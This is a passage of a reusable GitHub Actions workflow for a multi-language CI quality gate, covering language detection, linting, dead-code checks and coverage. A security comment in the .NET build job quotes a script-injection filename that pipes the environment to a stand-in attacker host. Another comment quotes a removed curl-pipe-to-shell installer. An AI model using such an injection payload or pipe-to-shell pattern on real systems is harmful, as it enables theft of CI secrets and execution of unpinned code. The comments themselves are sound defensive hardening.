# maxi-quality — the reusable quality gate (CONCEPT §7).
#
# A consuming repo's entire workflow file:
#
#   name: quality
#   on: [push, pull_request]
#   jobs:
#     quality:
#       uses: maximalcode/maxi-quality/.github/workflows/quality.yml@v1
#
# Callable from any repository. While this repo was private that needed an
# Actions access policy (access_level=user, issues #5/#8); publishing removed
# that constraint. The Layer 2 job pulls this repo's rules through the composite
# action download, so consumers need no PAT and no checkout of this repo.
#
# `#NN` in comments here refers to this project's pre-publication tracker,
# which stayed private. They record why something was decided. They are NOT
# this repo's issue numbers, which start fresh at #1.
#
# Version coupling, settled in #81:
#
# - `actions/layer2` is pinned by commit-SHA below (line ~1032), with a `# v1`
#   comment. The version tag still travels because a consumer needs to know
#   which release lineage they are on, but SHA-pinning means a moved tag cannot
#   silently change what runs inside an already-pinned consumer workflow.
# - This file is itself consumed BY COMMIT-SHA, not by tag, when a consumer
#   wants the Scorecard pinning check to pass. The documented adoption snippet
#   offers both: `@v1` for the easy path, and a SHA with `# v1` for the pinned
#   one. The pinned SHA is published alongside each release; see README.md.
#
# The v1 tag still exists and still moves — it is the "latest v1.x" pointer. A
# consumer on `@v1` accepts the Scorecard finding and the supply-chain trade-off
# it describes. A consumer on a SHA gets end-to-end immutability.
#
# v1 scope (deliberate): TypeScript (npm, or pnpm with a packageManager field),
# C#, Python (uv or pip), Rust (a committed Cargo.lock) and Java (MAVEN, with
# the baseline's lint region in the root pom). Anything else fails loud, not
# silent — detection refuses to hand back "no TypeScript here" for a repo that
# plainly has some.

name: quality

on:
  workflow_call:
    inputs:
      languages:
        description: >-
          'auto' detects by lockfile/project glob. Or a CSV subset of
          "ts,dotnet,python,rust,java" to force (e.g. "ts" to skip .NET on a
          mixed repo).
          'none' runs Layer 2 ONLY — the adoption entry point for a repo that
          wants secrets/vulns/conventions gated before taking on Layer 1.
        type: string
        default: 'auto'
      runner:
        description: >-
          The `runs-on` label for every job in this workflow. Default
          'ubuntu-latest'.

          Exists because a consumer on a private repo pays for GitHub-hosted
          minutes, and when that quota runs out an ubuntu-latest job does not
          run slowly — it does not start at all, and the gate goes dark. Point
          this at a self-hosted label ('self-hosted') and the gate keeps
          running on hardware the consumer already owns.

          A single label, not a JSON array: a self-hosted runner is registered
          per-repository, so 'self-hosted' already selects only that repo's own
          machines. Layer 2 supports Linux/X64, macOS/ARM64 and macOS/X64 (see
          the platform table in actions/layer2); anything else fails loudly
          rather than downloading an unpinned binary.
        type: string
        default: 'ubuntu-latest'
      node-version:
        type: string
        default: '24'
      dotnet-version:
        type: string
        default: '10.0.x'
      python-version:
        type: string
        default: '3.12'
      rust-version:
        description: >-
          Pinned Rust toolchain. Same argument as uv-version below — a consumer
          can hold or advance it without waiting on this repo, but the default
          is a PIN, never 'stable'. With RUSTFLAGS=-Dwarnings in the job, a
          toolchain bump that adds a clippy lint is a breaking change, and
          'stable' would ship one the morning it lands.
        type: string
        default: '1.97.1'
      java-version:
        description: >-
          Pinned JDK for the Java job. A PIN, never 'latest' and never a
          floating 'temurin' alias, for the same reason rust-version is one:
          Error Prone reaches into javac internals that move between releases,
          and with -Werror in the compiler args a JDK bump that adds an -Xlint
          category is a breaking change delivered by a tag nobody edited.
        type: string
        default: '25'
      uv-version:
        description: >-
          Pinned uv version for lockfile-based Python projects. Exposed as an
          input so a consumer can hold or advance it without waiting on this
          repo — but it has a PIN as a default, never "latest".
        type: string
        default: '0.12.3'
      changed-only:
        description: >-
          Base ref for new-code-only Layer 2 (adoption ratchet, CONCEPT §8).
          Empty = full scan. Also ratchets the dead-code gate below, on its
          results rather than on its inputs — see actions/deadcode.
        type: string
        default: ''
      dead-code:
        description: >-
          The dead-code and unused-dependency gate (#97): knip on TypeScript
          packages, deptry on Python ones.

          'auto' (default) runs each tool where the project has it installed
          and says loudly in the log where it does not. 'require' turns a
          missing tool into a failure — set it once adoption is done, so the
          gate cannot go quiet again. 'off' skips it.

          auto is the default because v1 is a MOVING TAG: 'require' would red
          every already-adopted repo the morning this ships, for a tool they
          have not installed yet.
        type: string
        default: 'auto'
      dead-code-exports:
        description: >-
          Also gate unused exports and types (knip). APPLICATION CODE ONLY —
          in a published library an export nothing in-repo references is
          indistinguishable from public API, and 19 of the 26 real-code
          findings in the evaluation sat in that class. Off by default for
          that reason: an unfixable finding is how a gate gets deleted.
        type: string
        default: 'false'
      licenses:
        description: >-
          Comma-separated SPDX allowlist, e.g. "MIT,Apache-2.0,ISC". Any
          dependency outside it fails the gate. Empty (default) = no licence
          gate. There is deliberately no default allowlist: measured against
          this repo's own tree, a plausible-looking one flagged
          SonarAnalyzer.CSharp and typing-extensions as "non-standard" and
          pathspec as MPL-2.0 — a default would be wrong for someone on day one,
          and a licence gate nobody chose is a licence gate everybody disables.
          The full inventory is in the standing report either way.
        type: string
        default: ''
      annotate:
        description: >-
          Render Semgrep findings as annotations on the pull-request diff, not
          only in the job log. On by default and purely additive — annotations
          are emitted after the verdict and cannot change it. Set 'false' if
          your review workflow does not want them.
        type: string
        default: 'true'
      max-annotations:
        description: >-
          Cap on annotations per run (default 50). GitHub drops them past a
          limit it does not document, and a legacy repo adopted without
          changed-only can produce hundreds. The omitted count is always
          reported — a silent truncation reads as "that was all of them".
        type: string
        default: '50'
      coverage-report:
        description: >-
          Name of an artifact, uploaded earlier in the SAME run, holding this
          repo's coverage report. Set it and the coverage gate runs: the
          aggregate ratchet, plus the patch gate over the lines the change
          added. Leave it empty and nothing coverage-related runs at all —
          there is no coverage job in the graph, which is what every existing
          consumer must keep seeing when v1 next moves.

          The baseline still never runs your tests (CONCEPT §12). Your own job
          produces the report and uploads it; this downloads that artifact.
          The caller therefore needs `needs:` from the test job to the
          quality.yml call, which the ADOPTION snippet shows.

          Report files are found inside the artifact BY CONTENT, not by name —
          lcov and Cobertura are both detected, wherever they sit in it.
        type: string
        default: ''
      coverage-floor-file:
        description: >-
          The committed floor the ratchet compares against. Lives in YOUR repo.
        type: string
        default: '.maxi-quality/coverage.json'
      coverage-patch-threshold:
        description: >-
          Minimum coverage, in percent, of the lines this change ADDS. The
          aggregate ratchet cannot see one new untested function inside a large
          well-covered repo; this is the number that can. '0' keeps the
          measurement and drops the gate.
        type: string
        default: '50'
      coverage-raise:
        description: >-
          One-time bootstrap. 'true' records the floor instead of demanding one,
          and prints the file to commit. It does NOT commit to your branch —
          that is a write to your default branch and this baseline does not take
          that permission on your behalf.

          Set it once, commit what the log prints, then remove it. A run left on
          'true' forever cannot fail on a drop, because it rewrites the floor it
          was about to be measured against.
        type: string
        default: 'false'
    outputs:
      # Exposed so a caller can assert that detection actually FIRED (#38).
      # Without this a consumer's run is green in two very different cases: the
      # gate ran and passed, or detection silently found nothing and every
      # language job skipped. Those must not look the same — a quality gate
      # that quietly stopped checking is the worst failure this repo has.
      #
      # A consuming repo can assert `has_ts == 'true'` for exactly this reason,
      # and should if it wants the guarantee.
      has_ts:
        description: 'true when at least one TypeScript project was detected'
        value: ${{ jobs.detect.outputs.has_ts }}
      has_dotnet:
        description: 'true when at least one .NET project was detected'
        value: ${{ jobs.detect.outputs.has_dotnet }}
      has_python:
        description: 'true when at least one Python project was detected'
        value: ${{ jobs.detect.outputs.has_python }}
      has_rust:
        description: 'true when at least one Rust crate was detected'
        value: ${{ jobs.detect.outputs.has_rust }}
      has_java:
        description: 'true when at least one Maven project was detected'
        value: ${{ jobs.detect.outputs.has_java }}

jobs:
  detect:
    runs-on: ${{ inputs.runner }}
    outputs:
      ts_dirs: ${{ steps.scan.outputs.ts_dirs }}
      dotnet_targets: ${{ steps.scan.outputs.dotnet_targets }}
      python_dirs: ${{ steps.scan.outputs.python_dirs }}
      rust_dirs: ${{ steps.scan.outputs.rust_dirs }}
      java_dirs: ${{ steps.scan.outputs.java_dirs }}
      has_ts: ${{ steps.scan.outputs.has_ts }}
      has_dotnet: ${{ steps.scan.outputs.has_dotnet }}
      has_python: ${{ steps.scan.outputs.has_python }}
      has_rust: ${{ steps.scan.outputs.has_rust }}
      has_java: ${{ steps.scan.outputs.has_java }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - id: scan
        shell: bash
        env:
          LANGS: ${{ inputs.languages }}
        run: |
          set -Eeuo pipefail
          # 'none' is handled EXPLICITLY, not left to fall through the match.
          # It would work either way today — "none" happens to match no language
          # — but that is an accident of string comparison, and the first person
          # to add input validation would silently turn "Layer 2 only" back into
          # "Layer 1 on everything". Consumer A depends on this value, so it is
          # a contract, spelled out.
          want() {
            [[ "$LANGS" == "none" ]] && return 1
            [[ "$LANGS" == "auto" || ",$LANGS," == *",$1,"* ]]
          }

          # TS: every directory holding a lockfile (workspace roots carry the
          # only lockfile in npm/pnpm monorepos, so this finds package roots).
          #
          # The lockfile is the right KEY and was the wrong TEST. A yarn or bun
          # repo has package.json and no supported lockfile, so has_ts came out
          # false, every TypeScript job skipped, and the run went green — while
          # scripts/adopt.sh, which keys on package.json, had already told the
          # same repo it was ADOPTED. Two halves of this baseline disagreeing
          # about whether a language is even present is the exact failure the
          # has_ts output exists to make visible, arriving through the one path
          # that output cannot see.
          #
          # So package.json is now the CROSS-CHECK, not the key: every one of
          # them must have a supported lockfile at or above it. Any that does
          # not stops the run. v1 gates npm and pnpm; per the header, anything
          # else fails loud rather than silently not running.
          ts_dirs='[]'
          if want ts; then
            lock_dirs=$(find . -name node_modules -prune -o -type f \
                          \( -name package-lock.json -o -name pnpm-lock.yaml \) -print0 \
                        | xargs -0 -r -n1 dirname | sed 's|^\./||' | sort -u)

            # Walking UP from each package.json rather than comparing directory
            # sets: in an npm/pnpm workspace only the root carries a lockfile and
            # every member carries a package.json, so a set comparison would
            # report every member as uncovered.
            uncovered=()
            while IFS= read -r -d '' pj; do
              d=$(dirname "$pj"); d=${d#./}
              probe="$d"; covered=0
              while :; do
                if grep -qxF -- "$probe" <<< "$lock_dirs"; then covered=1; break; fi
                [[ "$probe" == "." ]] && break
                probe=$(dirname "$probe")
              done
              (( covered )) || uncovered+=("$d")
            done < <(find . -name node_modules -prune -o -type f -name package.json -print0)

            if (( ${#uncovered[@]} )); then
              # Naming the lockfile they DO have is the difference between a
              # message someone acts on and one they file a bug about.
              other=$(find . -name node_modules -prune -o -type f \
                        \( -name yarn.lock -o -name bun.lockb -o -name bun.lock \) -print \
                      | sed 's|^\./||' | sort | tr '\n' ' ')
              hint='Commit a supported lockfile, or pass languages: without ts to skip them deliberately.'
              if [[ -n "$other" ]]; then
                hint="Found instead: ${other}— ${hint}"
              fi
              # tr, because a path may legally contain a newline and a newline in
              # an ::error:: line starts a second workflow command.
              list=$(printf '%s ' "${uncovered[@]}" | tr '\n' ' ')
              echo "::error::${#uncovered[@]} JavaScript/TypeScript project(s) have no supported lockfile at or above them: ${list}— so nothing would have linted them. v1 gates npm (package-lock.json) and pnpm (pnpm-lock.yaml). ${hint}"
              exit 1
            fi

            # Guarded, because `printf '%s\n' ""` emits one empty line and any
            # filter that drops it exits 1 — which fails the assignment under
            # `set -e` and aborts detection on every repo with no JavaScript.
            if [[ -n "$lock_dirs" ]]; then
              ts_dirs=$(printf '%s\n' "$lock_dirs" | jq -R . | jq -sc .)
            fi
          fi

          # .NET: solutions if any exist, else loose csproj files.
          #
          # A solution is preferred because building it once is faster than
          # building N projects and gets the reference ordering right. But
          # "prefer the .sln" TRUSTED it to reference everything, and a project
          # the solution omits is never built, so it is never analysed — and the
          # gate is green about code it never opened. The solutions are checked
          # against the tree now, and an omission is an error rather than a
          # silently smaller scan.
          dotnet_targets='[]'
          if want dotnet; then
            # *.slnx too (#56): the XML solution format, first-class since the
            # .NET 9 tooling. Consumer A has one, and a glob that only knew
            # *.sln fell back to loose csprojs — builds still happened, but
            # unordered and paying N restores instead of one. A .slnx lists
            #   <Project Path="src/Api/Api.csproj" />
            # so the quoted-csproj extraction below reads BOTH formats: the
            # quotes around the path are the shared shape, and the separator
            # normalisation covers a backslash-written Path the same way it
            # covers .sln's always-backslash entries.
            slns=$(find . -name node_modules -prune -o -type f \
                     \( -name '*.sln' -o -name '*.slnx' \) -print \
                   | sed 's|^\./||' | sort)
            csprojs=$(find . -name node_modules -prune -o -type f -name '*.csproj' -print \
                      | sed 's|^\./||' | sort)

            if [[ -n "$slns" ]]; then
              # A .sln lists each project as
              #   Project("{GUID}") = "Api", "src\Api\Api.csproj", "{GUID}"
              # with Windows separators even in solutions written on Linux, and
              # the path relative to the .sln's own directory. Comparing
              # realpath output sidesteps ../ normalisation, and skipping
              # references that do not exist is deliberate: a stale reference is
              # the solution's problem, not an uncovered project.
              sln_covered=$(
                while IFS= read -r sln; do
                  base=$(dirname "$sln")
                  { grep -oE '"[^"]+\.csproj"' "$sln" || true; } \
                    | tr -d '"' \
                    | while IFS= read -r p; do
                        p=${p//\\//}
                        # An `if`, not `[[ -f x ]] && realpath x` — as the last
                        # statement of this loop the && form returns 1 on a
                        # missing file, which fails the command substitution
                        # under `set -e`.
                        if [[ -f "$base/$p" ]]; then realpath "$base/$p"; fi
                      done
                done <<< "$slns" | sort -u
              )

              missing=()
              while IFS= read -r c; do
                [[ -n "$c" ]] || continue
                if ! grep -qxF -- "$(realpath "$c")" <<< "$sln_covered"; then
                  missing+=("$c")
                fi
              done <<< "$csprojs"

              if (( ${#missing[@]} )); then
                list=$(printf '%s ' "${missing[@]}" | tr '\n' ' ')
                echo "::error::${#missing[@]} project(s) exist in the tree but no solution references them: ${list}— they would never be built and therefore never analysed. Add them to a solution, or delete the solutions so every .csproj is built individually."
                exit 1
              fi

              dotnet_targets=$(printf '%s\n' "$slns" | jq -R . | jq -sc .)
            elif [[ -n "$csprojs" ]]; then
              dotnet_targets=$(printf '%s\n' "$csprojs" | jq -R . | jq -sc .)
            fi
          fi

          # Python: lockfile dirs, same reasoning as TS — in a uv/poetry
          # workspace only the ROOT carries a lock, while every member carries
          # its own pyproject.toml. Keying on pyproject would fan out one job
          # per workspace member and check the same tree N times.
          # pyproject/requirements are the fallback for un-locked projects.
          #
          # requirements-dev.txt is in that list because the job below accepts it
          # as a toolchain marker on its own — and ruff/mypy are dev dependencies,
          # so a project that pins ONLY its dev requirements is the normal shape
          # rather than an edge case. Detection used to omit it, which meant that
          # project was never detected and its Python job never ran, while the
          # step that would have run it was perfectly happy to. Two components
          # disagreeing about whether a language is present, again.
          python_dirs='[]'
          if want python; then
            python_dirs=$(find . \( -name node_modules -o -name .venv -o -name .git \) -prune -o -type f \
                            \( -name uv.lock -o -name poetry.lock \) -print0 \
                          | xargs -0 -r -n1 dirname | sort -u \
                          | sed 's|^\./||' | jq -R . | jq -sc .)
            if [[ "$python_dirs" == "[]" ]]; then
              python_dirs=$(find . \( -name node_modules -o -name .venv -o -name .git \) -prune -o -type f \
                              \( -name pyproject.toml -o -name requirements.txt -o -name requirements-dev.txt \) -print0 \
                            | xargs -0 -r -n1 dirname | sort -u \
                            | sed 's|^\./||' | jq -R . | jq -sc .)
            fi
          fi

          # Rust: the Cargo.lock directories, keyed and cross-checked exactly
          # like TS above — in a cargo workspace only the ROOT carries a lock
          # while every member carries a manifest, so keying on Cargo.toml would
          # fan out one job per member and analyse the same tree N times.
          #
          # The cross-check is not defensive here, it is the point. The job
          # below runs `--locked`, which REFUSES to run without a lockfile, so a
          # crate with no Cargo.lock at or above it cannot be analysed at all.
          # Rust arrived in this workflow (#70) precisely because it was going
          # green unexamined; a lockless crate is that same outcome one level
          # down, so it stops the run rather than reducing the scan.
          #
          # target/ is pruned: it holds manifests cargo vendored during a build,
          # which are not this repo's code. That name is cargo's reserved build
          # directory rather than a guess, so pruning it costs nothing real.
          # Rust is the one branch that PARSES a manifest instead of globbing
          # for one, so it is python rather than more find/grep. Two facts force
          # that, and both are the same failure the .NET branch above guards:
          #
          #   1. `--locked` cannot run without a Cargo.lock, so a crate with
          #      none is a crate clippy would never open.
          #   2. `cargo clippy --workspace` analyses a workspace's MEMBERS. A
          #      crate that is not one sits under the root's lockfile looking
          #      perfectly covered, and nothing ever reads it — the
          #      .csproj-no-solution-references bug in Cargo's spelling.
          #
          # (2) is why sed is not good enough: `members` is a list of globs in
          # TOML, and guessing at TOML is how you get a guard that passes
          # wrongly. tomllib is stdlib from 3.11 and this job pins
          # ubuntu-latest, which ships newer.
          rust_dirs='[]'
          if want rust; then
            rust_dirs=$(python3 - <<'PY'
          import glob, json, os, sys, tomllib

          PRUNE = {'node_modules', 'target', '.git', '.venv'}
          manifests, locks = [], []
          for root, dirs, files in os.walk('.'):
              dirs[:] = [d for d in dirs if d not in PRUNE]
              rel = os.path.relpath(root, '.')
              if 'Cargo.toml' in files:
                  manifests.append(rel)
              if 'Cargo.lock' in files:
                  locks.append(rel)

          lockset = set(locks)

          def lock_above(d):
              p = d
              while True:
                  if p in lockset:
                      return p
                  if p == '.':
                      return None
                  p = os.path.dirname(p) or '.'

          def load(path):
              try:
                  with open(path, 'rb') as fh:
                      return tomllib.load(fh)
              except (OSError, tomllib.TOMLDecodeError) as exc:
                  print(f'::error::{path} could not be parsed as TOML: {exc}', file=sys.stderr)
                  sys.exit(1)

          # Membership is cargo's rule, not a convenient approximation of it,
          # because this check HARD-FAILS a consumer's build and a false
          # positive there is worse than the hole it closes. Three sources, all
          # from the cargo book's workspace chapter:
          #   - the root package itself, when the root manifest has [package];
          #   - every `members` glob;
          #   - "All path dependencies residing in the workspace directory
          #     automatically become members" — transitively, so this walks.
          # `exclude` is the consumer saying "not part of this build", which is
          # a deliberate statement rather than an oversight; those crates are
          # dropped from the question entirely, exactly as `languages:` without
          # rust drops the whole language.
          covered, excluded = set(locks), set()
          for d in locks:
              root_mf = os.path.join(d, 'Cargo.toml')
              if not os.path.isfile(root_mf):
                  continue
              doc = load(root_mf)
              ws = doc.get('workspace')
              if ws is None:
                  continue
              for pat in ws.get('exclude', []):
                  for hit in glob.glob(os.path.join(d, pat)):
                      excluded.add(os.path.relpath(hit, '.'))
              queue = [d] if 'package' in doc else []
              for pat in ws.get('members', []):
                  for hit in glob.glob(os.path.join(d, pat)):
                      if os.path.isfile(os.path.join(hit, 'Cargo.toml')):
                          queue.append(os.path.relpath(hit, '.'))
              seen = set()
              while queue:
                  m = queue.pop()
                  if m in seen:
                      continue
                  seen.add(m)
                  covered.add(m)
                  mdoc = load(os.path.join(m, 'Cargo.toml'))
                  tables = [mdoc.get(t, {}) for t in
                            ('dependencies', 'dev-dependencies', 'build-dependencies')]
                  tables.append(doc.get('workspace', {}).get('dependencies', {}))
                  for table in tables:
                      for spec in table.values():
                          if not isinstance(spec, dict) or 'path' not in spec:
                              continue
                          dep = os.path.relpath(os.path.join(m, spec['path']), '.')
                          # "residing in the workspace directory" — a path
                          # dependency OUTSIDE it is not auto-promoted, and
                          # relpath starting '..' is exactly that test.
                          inside = not os.path.relpath(dep, d).startswith('..')
                          if inside and os.path.isfile(os.path.join(dep, 'Cargo.toml')):
                              queue.append(dep)

          no_lock = sorted(m for m in manifests if m not in excluded and lock_above(m) is None)
          orphaned = sorted(m for m in manifests
                            if m not in excluded and lock_above(m) is not None and m not in covered)

          # The two causes get separate messages because they have separate
          # fixes, and "here is the list" is the difference between a message
          # someone acts on and one they file a bug about.
          if no_lock:
              print(
                  f'::error::{len(no_lock)} Rust crate(s) have no Cargo.lock at or above them: '
                  f"{' '.join(no_lock)} — so nothing would have linted them. The Rust job runs "
                  "--locked, which cannot run without one: commit a lockfile ('cargo "
                  "generate-lockfile'), or pass languages: without rust to skip them deliberately.",
                  file=sys.stderr)
          if orphaned:
              print(
                  f'::error::{len(orphaned)} Rust crate(s) are under a workspace that does not list '
                  f"them as members: {' '.join(orphaned)} — cargo analyses members only, so they "
                  "would never be built and therefore never analysed. Add them to the workspace's "
                  "members, or give each its own committed Cargo.lock so it is gated in its own right.",
                  file=sys.stderr)
          if no_lock or orphaned:
              sys.exit(1)

          print(json.dumps(sorted(locks), separators=(',', ':')))
          PY
            )
          fi

          # Java: MAVEN ONLY in v1, and both halves of that are loud.
          #
          # The MATRIX UNIT is a ROOT pom — one that no other pom lists in its
          # <modules>. Maven builds an aggregator and its modules in one
          # reactor, so keying on every pom.xml would build the same tree once
          # per module, and <build><plugins> in an aggregator is INHERITED by
          # its modules, so the root is also where the baseline's region
          # belongs.
          #
          # The cross-check is the point, and it is this language's version of
          # the .csproj-no-solution-references guard. A pom.xml with no lint
          # region builds perfectly and analyses NOTHING — `mvn compile` on it
          # is green over code Error Prone never opened. That is the
          # looks-adopted-gates-nothing state, so it stops the run.
          #
          # Gradle fails loud rather than skipping, for the same reason a yarn
          # lockfile does: v1 supports Maven, and "no Java here" is a lie about
          # a repo that plainly has some.
          java_dirs='[]'
          if want java; then
            java_dirs=$(python3 - <<'PY'
          import json, os, re, sys, xml.etree.ElementTree as ET

          PRUNE = {'node_modules', 'target', '.git', '.venv', 'build'}
          poms, gradle = [], []
          for root, dirs, files in os.walk('.'):
              dirs[:] = [d for d in dirs if d not in PRUNE]
              rel = os.path.relpath(root, '.')
              if 'pom.xml' in files:
                  poms.append(rel)
              for g in ('build.gradle', 'build.gradle.kts'):
                  if g in files:
                      gradle.append(os.path.join(rel, g).lstrip('./'))

          if not poms:
              if gradle:
                  print(
                      f'::error::{len(gradle)} Gradle build file(s) found and no pom.xml: '
                      f"{' '.join(sorted(gradle))} — the Java layer is MAVEN-ONLY in v1, so "
                      "nothing would have analysed them. Gradle support gets built when a "
                      "Gradle consumer exists; until then pass languages: without java to "
                      "skip them deliberately.",
                      file=sys.stderr)
                  sys.exit(1)
              print('[]')
              raise SystemExit(0)

          def strip(tag):
              return tag.rsplit('}', 1)[-1]

          # A module path is relative to the aggregator's own directory, and may
          # name a file rather than a directory. Both forms resolve to the
          # directory that owns the child pom.
          modules = set()
          for d in poms:
              try:
                  root_el = ET.parse(os.path.join(d, 'pom.xml')).getroot()
              except ET.ParseError as exc:
                  print(f'::error::{d}/pom.xml could not be parsed as XML: {exc}', file=sys.stderr)
                  sys.exit(1)
              for el in root_el.iter():
                  if strip(el.tag) != 'module':
                      continue
                  child = os.path.normpath(os.path.join(d, (el.text or '').strip()))
                  if child.endswith('pom.xml'):
                      child = os.path.dirname(child)
                  modules.add(os.path.relpath(child, '.'))

          roots = sorted(d for d in poms if d not in modules)

          unwired = [
              d for d in roots
              if 'maxi-quality:begin' not in open(os.path.join(d, 'pom.xml'), encoding='utf-8').read()
          ]
          if unwired:
              print(
                  f'::error::{len(unwired)} Maven project(s) carry no maxi-quality lint region '
                  f"in their pom.xml: {' '.join(unwired)} — so `mvn compile` would build them "
                  "and analyse nothing, which is green over code Error Prone never opened. Run "
                  "scripts/adopt.sh against each of those directories, or pass languages: "
                  "without java to skip them deliberately.",
                  file=sys.stderr)
              sys.exit(1)

          print(json.dumps(roots, separators=(',', ':')))
          PY
            )
          fi

          has_ts=false; [[ "$ts_dirs" != "[]" ]] && has_ts=true
          has_dotnet=false; [[ "$dotnet_targets" != "[]" ]] && has_dotnet=true
          has_python=false; [[ "$python_dirs" != "[]" ]] && has_python=true
          has_rust=false; [[ "$rust_dirs" != "[]" ]] && has_rust=true
          has_java=false; [[ "$java_dirs" != "[]" ]] && has_java=true

          {
            echo "ts_dirs=$ts_dirs"
            echo "dotnet_targets=$dotnet_targets"
            echo "python_dirs=$python_dirs"
            echo "rust_dirs=$rust_dirs"
            echo "java_dirs=$java_dirs"
            echo "has_ts=$has_ts"
            echo "has_dotnet=$has_dotnet"
            echo "has_python=$has_python"
            echo "has_rust=$has_rust"
            echo "has_java=$has_java"
          } >> "$GITHUB_OUTPUT"
          echo "detected: ts=$ts_dirs dotnet=$dotnet_targets python=$python_dirs rust=$rust_dirs java=$java_dirs"

  typescript:
    needs: detect
    if: needs.detect.outputs.has_ts == 'true'
    runs-on: ${{ inputs.runner }}
    strategy:
      fail-fast: false
      matrix:
        dir: ${{ fromJSON(needs.detect.outputs.ts_dirs) }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7
        with:
          node-version: ${{ inputs.node-version }}
      - name: Install and lint
        shell: bash
        working-directory: ${{ matrix.dir }}
        run: |
          set -Eeuo pipefail
          if [[ -f pnpm-lock.yaml ]]; then
            # corepack reads the pinned "packageManager" field; a pnpm repo
            # without one fails here on purpose — pin it, don't guess it.
            if ! grep -q '"packageManager"' package.json; then
              echo '::error::pnpm-lock.yaml found but package.json has no "packageManager" field. Pin it (e.g. "pnpm@11.10.0") so CI and local installs agree.'
              exit 1
            fi
            corepack enable
            pnpm install --frozen-lockfile
            pnpm run lint
          else
            npm ci
            npm run lint
          fi

      # The gate that answers "should this code exist?" — every step above it
      # answers "is this code wrong?". Measured and adopted in #51, and until
      # #97 it ran only against this repo's own fixtures: adopt.sh wrote a
      # knip.json into every adopted repo and then listed knip as OPTIONAL, so
      # the layer reached no consumer at all.
      #
      # AFTER the lint, deliberately. A repo failing both should read the type
      # errors first — knip's answer to "is this file dead" is worth less when
      # the file does not compile.
      - name: Dead code and unused dependencies (knip)
        if: inputs.dead-code != 'off'
        uses: maximalcode/maxi-quality/actions/deadcode@v1
        with:
          tool: knip
          dir: ${{ matrix.dir }}
          mode: ${{ inputs.dead-code }}
          gate-exports: ${{ inputs.dead-code-exports }}
          changed-only: ${{ inputs.changed-only }}

  dotnet:
    needs: detect
    if: needs.detect.outputs.has_dotnet == 'true'
    runs-on: ${{ inputs.runner }}
    strategy:
      fail-fast: false
      matrix:
        target: ${{ fromJSON(needs.detect.outputs.dotnet_targets) }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6
        with:
          dotnet-version: ${{ inputs.dotnet-version }}
      # The gate lives in Directory.Build.props (TreatWarningsAsErrors) —
      # a plain build IS the analysis run.
      #
      # `env:`, NOT `dotnet build "${{ matrix.target }}"`. That value is a
      # FILENAME found by globbing the consumer's own tree, so it is whatever a
      # contributor put in a pull request — and `${{ }}` is substituted into the
      # script text before bash parses it. A file named
      #
      #     a";env|curl attacker.example -d@-;".csproj
      #
      # closed the quoted argument and ran the rest as shell, in the CONSUMER's
      # CI with the consumer's token. git allows quotes and semicolons in paths,
      # and the jq encoding in `detect` protects the YAML, not the shell.
      #
      # No slashes, deliberately: a filename cannot contain '/', which rules out
      # `curl https://host/path|sh` but is not a mitigation — that payload
      # exfiltrates the entire environment without needing one.
      #
      # env: hands bash a value instead of splicing text, so the same filename
      # is just an argument that fails to build.
      - name: Build
        shell: bash
        env:
          TARGET: ${{ matrix.target }}
        run: dotnet build "$TARGET"

  python:
    needs: detect
    if: needs.detect.outputs.has_python == 'true'
    runs-on: ${{ inputs.runner }}
    strategy:
      fail-fast: false
      matrix:
        dir: ${{ fromJSON(needs.detect.outputs.python_dirs) }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7
        with:
          python-version: ${{ inputs.python-version }}

      # v1 scope, deliberately narrow and LOUD about it: uv or pip. The project
      # supplies ruff/mypy as dev dependencies, exactly as a TS consumer supplies
      # eslint — this workflow runs the tools, it does not smuggle in its own
      # versions behind the project's back.
      #
      # Detection is its own step so the installer below can be conditional. It
      # used to be one branchy script, which is what forced `curl | sh` inline.
      - name: Which Python toolchain?
        id: mode
        shell: bash
        working-directory: ${{ matrix.dir }}
        run: |
          set -Eeuo pipefail
          if [[ -f uv.lock ]]; then
            echo 'tool=uv' >> "$GITHUB_OUTPUT"
          elif [[ -f requirements-dev.txt || -f requirements.txt ]]; then
            echo 'tool=pip' >> "$GITHUB_OUTPUT"
          else
            echo '::error::Python project detected but no uv.lock, requirements-dev.txt or requirements.txt. v1 supports uv and pip only — add one, or pass languages to exclude python.'
            exit 1
          fi

      # SHA-pinned, like every other action here. This step replaced
      # `curl -LsSf https://astral.sh/uv/install.sh | sh`, which was unpinned
      # remote code fetched over a moving URL and piped into a shell — inside a
      # workflow that runs in EVERY consumer's CI with THEIR token. A compromise
      # of that endpoint would have been a compromise of every adopter's
      # pipeline, and it flatly contradicted this repo's own pinning policy. The
      # `uses:` SHA guard in ci.yml never caught it because a pipe is not a
      # `uses:` line; that guard now covers this shape too.
      - name: Install uv
        if: steps.mode.outputs.tool == 'uv'
        uses: astral-sh/setup-uv@20cfd1bf945f4377ade1205e4dbc17946fc9a30d # v10.0.1
        with:
          version: ${{ inputs.uv-version }}

      - name: Lint and type-check (uv)
        if: steps.mode.outputs.tool == 'uv'
        shell: bash
        working-directory: ${{ matrix.dir }}
        run: |
          set -Eeuo pipefail
          uv sync --frozen --all-extras --dev
          uv run ruff check .
          uv run mypy .

      - name: Lint and type-check (pip)
        if: steps.mode.outputs.tool == 'pip'
        shell: bash
        working-directory: ${{ matrix.dir }}
        run: |
          set -Eeuo pipefail
          # Written as if-blocks, NOT `[[ -f x ]] && pip install x`.
          #
          # The precise rule, measured: under `set -e` a false `[[ ]] && cmd`
          # does NOT abort mid-script. It bites as the LAST statement of a
          # script — the script exits 1 and the step goes red — or of a
          # function, which then returns 1. An earlier version of this comment
          # claimed it aborts the job outright; that was wrong. `if` blocks are
          # still the right shape here, because the last of these lines IS the
          # last statement when requirements-dev.txt is absent.
          if [[ -f requirements.txt ]]; then
            pip install -r requirements.txt
          fi
          if [[ -f requirements-dev.txt ]]; then
            pip install -r requirements-dev.txt
          fi
          ruff check .
          mypy .

      # deptry's half of #97. Note what the action does with `dir`: it treats it
      # as a scan ROOT and enumerates the packages under it, because the matrix
      # value here is a LOCKFILE directory — in a uv or poetry workspace that is
      # the workspace root, which is precisely the invocation #52 measured and
